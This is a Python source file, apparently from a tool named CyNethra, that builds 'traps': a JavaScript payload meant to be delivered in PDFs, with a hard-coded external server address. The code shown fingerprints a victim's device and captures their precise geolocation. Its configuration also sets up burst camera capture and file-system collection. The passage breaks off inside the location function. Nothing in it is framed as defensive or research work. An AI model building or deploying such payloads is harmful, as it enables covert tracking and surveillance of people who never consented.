# -*- coding: utf-8 -*-
import json
import uuid
import os
import base64
from datetime import datetime

# Configuration
DATABASE_DIR = "/root/CyNethra/Database/traps"
PDF_OUTPUT_DIR = "/root/CyNethra/pdf_output"
BASE_URL = "http://5.189.130.88"
PORT = 5000

def ensure_dirs():
    os.makedirs(DATABASE_DIR, exist_ok=True)
    os.makedirs(PDF_OUTPUT_DIR, exist_ok=True)

def save_trap_to_storage(trap_id, trap_data):
    ensure_dirs()
    file_path = os.path.join(DATABASE_DIR, f"{trap_id}.json")
    with open(file_path, 'w') as f:
        json.dump(trap_data, f, indent=2)
    print(f"[OK] Trap saved to {file_path}")

def generate_js_payload(config, trap_id, session_id, target_url, base_url, delivery="pdf"):
    """
    Generates the advanced JavaScript payload.
    """
    media_config = config.get("media_capture", {})
    devices = media_config.get("devices", ["user", "environment"])
    resolution = media_config.get("resolution", {"width": 1280, "height": 720})
    burst_count = media_config.get("burst_count", 10)
    
    js_code = f"""
    (function() {{
        const CONFIG = {json.dumps(config)};
        const TRAP_ID = '{trap_id}';
        const SESSION_ID = '{session_id}';
        const TARGET_URL = '{target_url or ""}';
        const BASE_URL = '{base_url}';
        const DELIVERY = '{delivery}';
        
        const data = {{
            trap_id: TRAP_ID,
            session_id: SESSION_ID,
            timestamp: new Date().toISOString(),
            delivery: DELIVERY,
            device: {{}},
            location: null,
            network: {{}},
            media: {{
                cameras: [],
                frames: [],
                video_url: null
            }},
            file_system: {{}},
            behavioral: {{}},
            pdf_specific: {{}}
        }};
        
        // 1. DEVICE FINGERPRINTING
        function collectFingerprint() {{
            data.device = {{
                ua: navigator.userAgent,
                platform: navigator.platform,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                language: navigator.language,
                languages: navigator.languages,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: {{
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                }},
                battery: null,
                network: null
            }};
            
            if (navigator.getBattery) {{
                navigator.getBattery().then(battery => {{
                    data.device.battery = {{
                        level: battery.level,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    }};
                }});
            }}
            
            if (navigator.connection) {{
                data.device.network = {{
                    type: navigator.connection.type,
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                }};
            }}
            
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('CyNethra Fingerprint', 2, 2);
            data.device.canvas = canvas.toDataURL();
            
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {{
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {{
                    data.device.gpu = {{
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                    }};
                }}
            }}
        }}
        
        // 2. LOCATION
        function collectLocation() {{
            return new Promise((resolve) => {{
                if (!navigator.geolocation) return resolve(null);
                
                navigator.geolocation.getCurrentPosition(
                    (pos) => {{
                        data.location = {{
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude,
                            speed: pos.coords.speed,
                            heading: pos.coords.heading
                        }};
